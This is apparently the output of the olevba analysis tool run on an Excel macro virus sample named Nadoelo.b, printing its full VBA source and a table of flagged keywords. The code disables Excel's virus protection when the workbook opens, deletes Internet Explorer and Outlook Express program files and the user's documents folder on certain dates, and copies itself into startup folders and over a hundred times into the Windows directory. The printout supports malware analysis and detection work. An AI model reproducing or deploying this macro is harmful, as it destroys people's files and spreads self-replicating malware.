olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Nadoelo.b.xls
Type: Text
-------------------------------------------------------------------------------
VBA MACRO Virus.MSExcel.Nadoelo.b.xls 
in file: Virus.MSExcel.Nadoelo.b.xls - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'******************************
'Excel macro virus name: Nadelu
'******************************
'Brasil 2005
'************

Sub Auto_Open()
On Error Resume Next
With Options
.VirusProtection = False
End With
Application.Caption = "Excel macro virus 2005"
MsgBox " No seu computador Internet Explorer e Outlook Express foram deletados !", vbOKOnly + vbCritical, " Excel virus !!"
Kill "C:\Program Files\Internet Explorer\*.*"
Kill "C:\Program Files\Outlook Express\*.*"
Kill "C:\Arquivos de programas\Internet Explorer\*.*"
Kill "C:\Arquivos de programas\Outlook Express\*.*"
      
ActiveWorkbook.SaveCopyAs "C:\Program Files\Microsoft Office\Office\XLStart\Olenu.xls"

ActiveWorkbook.SaveCopyAs "C:\Program Files\Microsoft Office\Office10\XLStart\Olenu.xls"

ActiveWorkbook.SaveCopyAs "C:\Arquivos de Programas\Microsoft Office\Office\XLStart\Olenu.xls"
 
ActiveWorkbook.SaveCopyAs "C:\Arquivos de Programas\Microsoft Office\Office10\XLStart\Olenu.xls"
 
For i = 1 To 165
ActiveWorkbook.SaveCopyAs "C:\Windows\Rodazino" & i & ".xls"
Next
'Save 165 times with viral code named Rodazino1,Rodazino2,...
 
If Day(Now()) = 9 Or (Day(Now)) = 19 Or (Day(Now)) = 29 Then
MsgBox " Computador apresenta defeitos !", vbOKOnly + vbCritical, " Excel macro virus !!"
Kill "C:\My Documents\*.*"
Kill "C:\Meus Documentos\*.*"
    

Set myDocument = Worksheets(1)
With myDocument.Shapes.AddShape(msoShapeRectangle, _
        0, 0, 270, 190).TextFrame
    .AutoMargins = False
    .Characters.Text = "Seu Excel esta defeituoso!!"
    .MarginBottom = 0
    .MarginLeft = 100
    .MarginRight = 0
    .MarginTop = 70
End With

ActiveWindow.Visible = False
ActiveWorkbook.Save
ActiveWorkbook.Close

End If

End Sub
Sub Auto_Close()

If ThisWorkbook.Name = "Olenu.xls" Then
ThisWorkbook.Close SaveChanges:=False

End If
End Sub

Private Sub App_WorkbookActivate(ByVal Wb As Workbook)
    Application.Windows.Arrange xlArrangeStyleTiled
End Sub









+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Auto_Close          |Runs when the Excel Workbook is closed       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
+----------+--------------------+---------------------------------------------+

